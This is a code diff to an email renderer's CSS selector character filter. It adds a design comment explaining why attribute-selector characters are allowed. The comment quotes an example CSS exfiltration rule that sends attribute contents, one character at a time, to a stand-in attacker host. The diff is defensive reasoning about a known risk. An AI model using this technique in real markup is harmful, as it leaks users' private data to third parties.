@@ -910,6 +910,17 @@ bool selector_char_allowed(char c) {
     case '+': case '~': case '>':
     // Pseudo-classes and attribute selectors: `:nth-child(2n+1)` and
     // `[class~="mobile"]` both appear in real mail.
+    //
+    // Attribute selectors carry a known exfiltration technique — a run of
+    // `a[href^="a"]{background:url(https://evil/?c=a)}` rules leaks an
+    // attribute's contents one character at a time through which requests
+    // fire. It is ACCEPTED here, deliberately: a selector can only match
+    // attributes inside the message its own sender wrote, so they would be
+    // exfiltrating their own content. It becomes real only if something the
+    // reader owns ever lands in an attribute, which nothing currently does.
+    // Refusing `[` would break the `[class~="..."]` rules real mail relies on,
+    // which is a certain cost against a hypothetical one. Revisit if message
+    // markup ever carries reader-derived attribute values.
     case ':': case '(': case ')': case '[': case ']': case '=':
     case '"': case '\'':
       return true;
